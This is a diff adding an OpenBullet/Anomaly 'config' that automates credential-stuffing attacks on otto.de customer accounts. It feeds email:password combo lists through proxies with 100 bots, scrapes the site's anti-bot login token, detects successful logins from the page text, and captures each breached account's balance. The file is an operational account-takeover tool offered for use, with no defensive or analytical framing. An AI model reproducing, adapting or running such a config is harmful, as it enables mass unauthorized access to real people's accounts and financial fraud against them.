@@ -1,0 +1,91 @@
+﻿[SETTINGS]
+{
+  "Name": "OTTO.DE_Android",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-06-16T06:09:06.0727985-07:00",
+  "AdditionalInfo": "",
+  "Author": "@Mhammd_Mh",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 6,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#GET-MAGICWORD REQUEST GET "https://www.otto.de/user/login" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#MAGIC-WORD PARSE "<SOURCE>" LR "id=\"us_js_aKindOfMagic\" data-value=\"" "\"></div>" -> VAR "Token" 
+
+#LOGIN_(POST) REQUEST POST "https://www.otto.de/user/login" 
+  CONTENT "username=<USER>&password=<PASS>&postcode=&lastname=&appRememberMe=true&magicWord=<Token>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: www.otto.de" 
+  HEADER "Connection: close" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" 
+  HEADER "Origin: https://www.otto.de" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 5.1.1; A5010 Build/LMY48Z) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/39.0.0.0 Mobile Safari/537.36" 
+  HEADER "Referer: https://www.otto.de/user/login?tk=1122531277&uri=/user/overview" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Die E-Mail-Adresse oder das Passwort stimmen nicht mit den bei uns hinterlegten Daten überein. Bitte überprüfe deine Eingaben und versuche es noch mal" 
+  KEYCHAIN Success OR 
+    KEY "Abmelden" 
+
+#GET-BALANCE REQUEST GET "https://www.otto.de/aftersales/balanceForBookingsWithDebit?employee=false&psfids=eb0b4c4dba0c06d9a731e87fb5931509153866834&scid=1592312619290&cachefix=Cy5Z6391aJ&ts_Type=merge" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#BALANCE PARSE "<SOURCE>" LR "qa=\"aftersales_balancing_for_booking_amount\">" "</div>" CreateEmpty=FALSE -> CAP "Balance" 
+
+#LAST-UPDATE PARSE "<SOURCE>" LR "Letzter Stand: " "</div>" CreateEmpty=FALSE -> CAP "Last Update" 
+
+#CREATOR FUNCTION Constant "@Mhammd_Mh" -> CAP "Config Made By" 
+
